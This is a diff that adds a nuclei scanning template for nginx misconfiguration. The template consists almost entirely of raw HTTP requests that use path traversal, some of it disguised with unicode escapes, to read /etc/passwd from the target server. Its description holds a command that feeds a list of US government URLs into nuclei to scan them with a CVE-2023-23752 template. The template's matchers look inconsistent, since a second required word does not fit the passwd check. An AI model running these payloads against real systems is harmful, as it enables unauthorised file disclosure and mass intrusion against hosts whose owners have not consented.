@@ -1,0 +1,86 @@
+id: nginx_Misconfiguration
+
+info:
+  name: nginx_Misconfiguration
+  author: 51pwn
+  severity: critical
+  description: |
+    nginx_Misconfiguration
+    
+    cat atckData/us_gov_httpx.json|jq '.url'|sed 's/"//g'|sort -u|nuclei -duc -t $PWD/config/51pwn/CVE-2023-23752.yaml -json -o us_gov_nuclei_CVE-2023-23752.json
+    
+  reference:
+    - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nginx
+    - https://51pwn.com
+  tags: web,cve,2023
+
+requests:
+  - raw:
+      - |+
+        GET /css../../../../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        Accept:*/*
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        Pragma:no-cache
+        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+        Connection: close
+      - |+
+        GET /assets../../../../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        Accept:*/*
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        Pragma:no-cache
+        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+        Connection: close
+        
+      - |+
+        GET /Public../../../../../../../../../../../\u0065\u0074\u0063/\u0070\u0061\u0073\u0073\u0077\u0064 HTTP/1.1
+        Host: {{Hostname}}
+        Accept:*/*
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        Pragma:no-cache
+        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+        Connection: close
+      - |+
+        GET /Public/static../../../../../../../../../../../\u0065\u0074\u0063/\u0070\u0061\u0073\u0073\u0077\u0064 HTTP/1.1
+        Host: {{Hostname}}
+        Accept:*/*
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        Pragma:no-cache
+        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+        Connection: close
+      - |+
+        GET /static../../../../../../../../../../../\u0065\u0074\u0063/\u0070\u0061\u0073\u0073\u0077\u0064 HTTP/1.1
+        Host: {{Hostname}}
+        Accept:*/*
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        Pragma:no-cache
+        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+        Connection: close
+    unsafe: true
+    pipeline: true
+    # pipeline-concurrent-connections: 40
+    # pipeline-requests-per-connection: 25000
+    cookie-reuse: true
+    req-condition: true
+    matchers-condition: and
+    stop-at-first-match: true
+    matchers:
+      # - type: status
+      #   status:
+      #     - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - '":0:0:'
+
+      - type: word
+        part: body
+        words:
+          - "attributes"
